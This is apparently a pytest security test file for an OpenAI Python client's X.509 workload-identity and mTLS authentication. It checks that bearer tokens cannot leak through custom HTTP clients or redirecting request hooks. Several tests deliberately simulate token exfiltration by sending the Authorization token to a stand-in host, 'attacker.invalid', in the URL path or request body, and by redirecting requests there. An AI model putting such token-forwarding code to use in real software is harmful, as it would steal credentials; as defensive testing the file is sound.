from __future__ import annotations

from typing import Any
from typing_extensions import override

import httpx2
import pytest

from openai import OpenAI, AsyncOpenAI, OpenAIError
from openai.auth import X509WorkloadIdentity, x509_workload_identity

_TOKEN_URL = "https://mtls.auth.openai.com/oauth/token"


_API_URL = "https://mtls.api.openai.com/v1/models"


def _identity() -> X509WorkloadIdentity:
    return x509_workload_identity(identity_provider_id="idp_example", service_account_id="svc_example")


def _response(request: httpx2.Request) -> httpx2.Response:
    if str(request.url) == _TOKEN_URL:
        return httpx2.Response(200, request=request, json={"access_token": "access-token", "expires_in": 3600})
    return httpx2.Response(200, request=request, json={"object": "list", "data": []})


def _record(requests: list[httpx2.Request], request: httpx2.Request) -> httpx2.Response:
    requests.append(request)
    return _response(request)


@pytest.mark.parametrize("credential_location", ["path", "nested_body"])
def test_sync_x509_never_exposes_protected_dispatch_to_custom_send(credential_location: str) -> None:
    requests: list[httpx2.Request] = []
    custom_sends: list[httpx2.Request] = []

    class ReconstructingClient(httpx2.Client):
        @override
        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
            custom_sends.append(request)
            if request.url.host == "mtls.api.openai.com":
                token = request.headers["Authorization"].removeprefix("Bearer ")
                url = (
                    f"https://attacker.invalid/{token}" if credential_location == "path" else "https://attacker.invalid"
                )
                content = token.replace("-", "%252D").encode() if credential_location == "nested_body" else None
                return self.send(httpx2.Request("POST", url, content=content), **kwargs)
            return super().send(request, **kwargs)

    transport = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
    with OpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
        assert client.models.list().object == "list"

    assert custom_sends == []
    assert [str(request.url) for request in requests] == [_TOKEN_URL, _API_URL]


@pytest.mark.parametrize("credential_location", ["path", "nested_body"])
async def test_async_x509_never_exposes_protected_dispatch_to_custom_send(credential_location: str) -> None:
    requests: list[httpx2.Request] = []
    custom_sends: list[httpx2.Request] = []

    class ReconstructingClient(httpx2.AsyncClient):
        @override
        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
            custom_sends.append(request)
            if request.url.host == "mtls.api.openai.com":
                token = request.headers["Authorization"].removeprefix("Bearer ")
                url = (
                    f"https://attacker.invalid/{token}" if credential_location == "path" else "https://attacker.invalid"
                )
                content = token.replace("-", "%252D").encode() if credential_location == "nested_body" else None
                return await self.send(httpx2.Request("POST", url, content=content), **kwargs)
            return await super().send(request, **kwargs)

    transport = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
    async with AsyncOpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
        assert (await client.models.list()).object == "list"

    assert custom_sends == []
    assert [str(request.url) for request in requests] == [_TOKEN_URL, _API_URL]


def test_sync_x509_does_not_install_process_wide_dispatch_guards() -> None:
    requests: list[httpx2.Request] = []
    original_dispatch = httpx2.Client._send_single_request

    def hook(request: httpx2.Request) -> None:
        if request.url.host == "mtls.api.openai.com":
            assert httpx2.Client._send_single_request is original_dispatch
            assert transport.post("https://telemetry.example/collect", content=b"%41" * 1024).status_code == 200

    transport = httpx2.Client(
        transport=httpx2.MockTransport(lambda request: _record(requests, request)), event_hooks={"request": [hook]}
    )
    with OpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
        assert client.models.list().object == "list"

    assert httpx2.Client._send_single_request is original_dispatch
    assert [request.url.host for request in requests] == [
        "mtls.auth.openai.com",
        "telemetry.example",
        "mtls.api.openai.com",
    ]


async def test_async_x509_does_not_install_process_wide_dispatch_guards() -> None:
    requests: list[httpx2.Request] = []
    original_dispatch = httpx2.AsyncClient._send_single_request

    async def hook(request: httpx2.Request) -> None:
        if request.url.host == "mtls.api.openai.com":
            assert httpx2.AsyncClient._send_single_request is original_dispatch
            assert (await transport.post("https://telemetry.example/collect", content=b"%41" * 1024)).status_code == 200

    transport = httpx2.AsyncClient(
        transport=httpx2.MockTransport(lambda request: _record(requests, request)), event_hooks={"request": [hook]}
    )
    async with AsyncOpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
        assert (await client.models.list()).object == "list"

    assert httpx2.AsyncClient._send_single_request is original_dispatch
    assert [request.url.host for request in requests] == [
        "mtls.auth.openai.com",
        "telemetry.example",
        "mtls.api.openai.com",
    ]


def test_sync_x509_preserves_explicit_sni_for_custom_origins() -> None:
    requests: list[httpx2.Request] = []

    def hook(request: httpx2.Request) -> None:
        request.extensions["sni_hostname"] = "private-pki.example"

    transport = httpx2.Client(
        transport=httpx2.MockTransport(lambda request: _record(requests, request)), event_hooks={"request": [hook]}
    )
    with OpenAI(
        workload_identity=_identity(), http_client=transport, base_url="https://custom.example/v1", max_retries=0
    ) as client:
        assert client.models.list().object == "list"

    assert [str(request.url) for request in requests] == [_TOKEN_URL, "https://custom.example/v1/models"]
    assert requests[-1].extensions["sni_hostname"] == "private-pki.example"


async def test_async_x509_preserves_explicit_sni_for_custom_origins() -> None:
    requests: list[httpx2.Request] = []

    async def hook(request: httpx2.Request) -> None:
        request.extensions["sni_hostname"] = "private-pki.example"

    transport = httpx2.AsyncClient(
        transport=httpx2.MockTransport(lambda request: _record(requests, request)), event_hooks={"request": [hook]}
    )
    async with AsyncOpenAI(
        workload_identity=_identity(), http_client=transport, base_url="https://custom.example/v1", max_retries=0
    ) as client:
        assert (await client.models.list()).object == "list"

    assert [str(request.url) for request in requests] == [_TOKEN_URL, "https://custom.example/v1/models"]
    assert requests[-1].extensions["sni_hostname"] == "private-pki.example"


@pytest.mark.parametrize("extension", ["sni_hostname", "target"])
def test_sync_x509_rejects_conflicting_transport_extensions_on_openai_mtls_origins(extension: str) -> None:
    requests: list[httpx2.Request] = []

    def hook(request: httpx2.Request) -> None:
        request.extensions[extension] = "attacker.example" if extension == "sni_hostname" else b"https://attacker/"

    http_client = httpx2.Client(
        transport=httpx2.MockTransport(lambda request: _record(requests, request)),
        event_hooks={"request": [hook]},
    )
    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        with pytest.raises(OpenAIError, match="hostname|target"):
            client.models.list()

    assert [str(request.url) for request in requests] == [_TOKEN_URL]


@pytest.mark.parametrize("extension", ["sni_hostname", "target"])
async def test_async_x509_rejects_conflicting_transport_extensions_on_openai_mtls_origins(extension: str) -> None:
    requests: list[httpx2.Request] = []

    async def hook(request: httpx2.Request) -> None:
        request.extensions[extension] = "attacker.example" if extension == "sni_hostname" else b"https://attacker/"

    http_client = httpx2.AsyncClient(
        transport=httpx2.MockTransport(lambda request: _record(requests, request)),
        event_hooks={"request": [hook]},
    )
    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        with pytest.raises(OpenAIError, match="hostname|target"):
            await client.models.list()

    assert [str(request.url) for request in requests] == [_TOKEN_URL]


@pytest.mark.parametrize("mutation", ["transport", "mounts"])
def test_sync_x509_rejects_request_hook_destination_changes_after_transport_replacement(mutation: str) -> None:
    requests: list[httpx2.Request] = []
    http_client = httpx2.Client(transport=httpx2.MockTransport(lambda request: _record(requests, request)))

    def hook(request: httpx2.Request) -> None:
        request.url = httpx2.URL("https://attacker.invalid/capture")
        request.headers["host"] = "attacker.invalid"
        replacement = httpx2.MockTransport(lambda redirected: _record(requests, redirected))
        if mutation == "transport":
            http_client._transport = replacement
        else:
            http_client._mounts.clear()
            http_client._transport = replacement

    http_client.event_hooks["request"].append(hook)
    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        with pytest.raises(OpenAIError, match="configured API origin"):
            client.models.list()

    assert [str(request.url) for request in requests] == [_TOKEN_URL]


@pytest.mark.parametrize("mutation", ["transport", "mounts"])
async def test_async_x509_rejects_request_hook_destination_changes_after_transport_replacement(mutation: str) -> None:
    requests: list[httpx2.Request] = []
    http_client = httpx2.AsyncClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))

    async def hook(request: httpx2.Request) -> None:
        request.url = httpx2.URL("https://attacker.invalid/capture")
        request.headers["host"] = "attacker.invalid"
        replacement = httpx2.MockTransport(lambda redirected: _record(requests, redirected))
        if mutation == "transport":
            http_client._transport = replacement
        else:
            http_client._mounts.clear()
            http_client._transport = replacement

    http_client.event_hooks["request"].append(hook)
    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        with pytest.raises(OpenAIError, match="configured API origin"):
            await client.models.list()

    assert [str(request.url) for request in requests] == [_TOKEN_URL]


def test_sync_x509_does_not_traverse_unrelated_custom_client_state() -> None:
    class UninspectableHistory(dict[str, object]):
        @override
        def values(self) -> Any:
            raise AssertionError("unrelated application-owned request history was traversed")

    http_client = httpx2.Client(transport=httpx2.MockTransport(_response))
    vars(http_client)["request_history"] = UninspectableHistory({"nested": {"large": [object()]}})

    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        assert client.models.list().object == "list"


async def test_async_x509_does_not_traverse_unrelated_custom_client_state() -> None:
    class UninspectableHistory(dict[str, object]):
        @override
        def values(self) -> Any:
            raise AssertionError("unrelated application-owned request history was traversed")

    http_client = httpx2.AsyncClient(transport=httpx2.MockTransport(_response))
    vars(http_client)["request_history"] = UninspectableHistory({"nested": {"large": [object()]}})

    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        assert (await client.models.list()).object == "list"


def test_sync_x509_keeps_equal_http_clients_in_distinct_security_scopes() -> None:
    class EqualClient(httpx2.Client):
        @override
        def __eq__(self, other: object) -> bool:
            return isinstance(other, EqualClient)

        @override
        def __hash__(self) -> int:
            return 1

    first_requests: list[httpx2.Request] = []
    second_requests: list[httpx2.Request] = []
    first_transport = EqualClient(transport=httpx2.MockTransport(lambda request: _record(first_requests, request)))
    second_transport = EqualClient(transport=httpx2.MockTransport(lambda request: _record(second_requests, request)))

    def redirect(request: httpx2.Request) -> None:
        request.url = httpx2.URL("https://attacker.invalid/capture")
        request.headers["host"] = "attacker.invalid"

    second_transport.event_hooks["request"].append(redirect)
    with OpenAI(workload_identity=_identity(), http_client=first_transport, max_retries=0) as first:
        assert first.models.list().object == "list"
        with OpenAI(workload_identity=_identity(), http_client=second_transport, max_retries=0) as second:
            with pytest.raises(OpenAIError, match="configured API origin"):
                second.models.list()

    assert [str(request.url) for request in second_requests] == [_TOKEN_URL]


async def test_async_x509_keeps_equal_http_clients_in_distinct_security_scopes() -> None:
    class EqualClient(httpx2.AsyncClient):
        @override
        def __eq__(self, other: object) -> bool:
            return isinstance(other, EqualClient)

        @override
        def __hash__(self) -> int:
            return 1

    first_requests: list[httpx2.Request] = []
    second_requests: list[httpx2.Request] = []
    first_transport = EqualClient(transport=httpx2.MockTransport(lambda request: _record(first_requests, request)))
    second_transport = EqualClient(transport=httpx2.MockTransport(lambda request: _record(second_requests, request)))

    async def redirect(request: httpx2.Request) -> None:
        request.url = httpx2.URL("https://attacker.invalid/capture")
        request.headers["host"] = "attacker.invalid"

    second_transport.event_hooks["request"].append(redirect)
    async with AsyncOpenAI(workload_identity=_identity(), http_client=first_transport, max_retries=0) as first:
        assert (await first.models.list()).object == "list"
        async with AsyncOpenAI(workload_identity=_identity(), http_client=second_transport, max_retries=0) as second:
            with pytest.raises(OpenAIError, match="configured API origin"):
                await second.models.list()

    assert [str(request.url) for request in second_requests] == [_TOKEN_URL]


def test_sync_x509_accepts_unhashable_custom_http_clients() -> None:
    class UnhashableClient(httpx2.Client):
        @override
        def __eq__(self, other: object) -> bool:
            return self is other

    http_client = UnhashableClient(transport=httpx2.MockTransport(_response))
    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        assert client.models.list().object == "list"


async def test_async_x509_accepts_unhashable_custom_http_clients() -> None:
    class UnhashableClient(httpx2.AsyncClient):
        @override
        def __eq__(self, other: object) -> bool:
            return self is other

    http_client = UnhashableClient(transport=httpx2.MockTransport(_response))
    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        assert (await client.models.list()).object == "list"


def test_sync_x509_preserves_caller_default_response_encoding() -> None:
    def handler(request: httpx2.Request) -> httpx2.Response:
        if str(request.url) == _TOKEN_URL:
            return _response(request)
        return httpx2.Response(200, request=request, content=b"caf\xe9", headers={"content-type": "text/plain"})

    transport = httpx2.Client(transport=httpx2.MockTransport(handler), default_encoding="latin-1")
    with OpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
        response = client.get("/text", cast_to=httpx2.Response)

    assert response.encoding == "latin-1"
    assert response.text == "café"


async def test_async_x509_preserves_caller_default_response_encoding() -> None:
    def handler(request: httpx2.Request) -> httpx2.Response:
        if str(request.url) == _TOKEN_URL:
            return _response(request)
        return httpx2.Response(200, request=request, content=b"caf\xe9", headers={"content-type": "text/plain"})

    transport = httpx2.AsyncClient(transport=httpx2.MockTransport(handler), default_encoding="latin-1")
    async with AsyncOpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
        response = await client.get("/text", cast_to=httpx2.Response)

    assert response.encoding == "latin-1"
    assert response.text == "café"


def test_sync_x509_preserves_mounted_transports_and_restores_caller_configuration() -> None:
    exchange_requests: list[httpx2.Request] = []
    api_requests: list[httpx2.Request] = []
    exchange_transport = httpx2.MockTransport(lambda request: _record(exchange_requests, request))
    api_transport = httpx2.MockTransport(lambda request: _record(api_requests, request))
    http_client = httpx2.Client(
        transport=exchange_transport,
        mounts={"https://mtls.api.openai.com": api_transport},
        trust_env=False,
    )
    original_mounts = http_client._mounts

    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        assert client.models.list().object == "list"
        assert http_client._transport is exchange_transport
        assert http_client._mounts is original_mounts

    assert [str(request.url) for request in exchange_requests] == [_TOKEN_URL]
    assert [str(request.url) for request in api_requests] == [_API_URL]


async def test_async_x509_preserves_mounted_transports_and_restores_caller_configuration() -> None:
    exchange_requests: list[httpx2.Request] = []
    api_requests: list[httpx2.Request] = []
    exchange_transport = httpx2.MockTransport(lambda request: _record(exchange_requests, request))
    api_transport = httpx2.MockTransport(lambda request: _record(api_requests, request))
    http_client = httpx2.AsyncClient(
        transport=exchange_transport,
        mounts={"https://mtls.api.openai.com": api_transport},
        trust_env=False,
    )
    original_mounts = http_client._mounts

    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
        assert (await client.models.list()).object == "list"
        assert http_client._transport is exchange_transport
        assert http_client._mounts is original_mounts

    assert [str(request.url) for request in exchange_requests] == [_TOKEN_URL]
    assert [str(request.url) for request in api_requests] == [_API_URL]
